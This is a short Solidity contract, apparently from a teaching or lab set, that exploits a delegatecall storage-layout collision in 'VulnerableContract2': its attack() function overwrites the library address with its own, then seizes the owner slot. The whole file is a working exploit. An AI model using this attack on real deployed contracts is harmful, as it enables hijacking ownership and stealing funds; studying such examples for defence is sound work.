// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./VulnerableContract2.sol";

contract MaliciousContract2 {
    // Make sure the storage layout is the same as VulnerableContract2
    // This will allow us to correctly update the state variables
    address public lib;
    address public owner;
    uint256 public someNumber;

    VulnerableContract2 public vulnerableContract2;

    constructor(VulnerableContract2 _vulnerableContract2) {
        vulnerableContract2 = VulnerableContract2(_vulnerableContract2);
    }

    function attack() public {
        // override address of lib
        vulnerableContract2.doSomething(uint256(uint160(address(this))));
        // pass any number as input, the function doSomething() below will
        // be called
        vulnerableContract2.doSomething(1);
    }

    // function signature must match VulnerableContract2.doSomething()
    function doSomething(uint256 _num) public {
        owner = msg.sender;
    }
}
